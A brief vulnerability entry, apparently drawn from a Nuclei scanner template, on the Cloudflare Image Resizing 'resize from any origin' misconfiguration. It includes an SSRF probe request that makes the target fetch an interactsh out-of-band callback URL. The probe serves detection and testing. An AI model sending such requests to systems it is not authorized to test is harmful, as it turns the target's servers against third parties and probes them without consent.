# Vulnerability: Cloudflare External Image Resizing Misconfiguration
**Classification:** CLOUDFLARE
**Source:** Nuclei Template (`cloudflare-image-ssrf.yaml`)

## Description
Cloudflare Image Resizing defaults to restricting resizing to the same domain. This prevents third parties from resizing any image at any origin. However, you can enable this option if you check Resize images from any origin.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /cdn-cgi/image/width/https://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

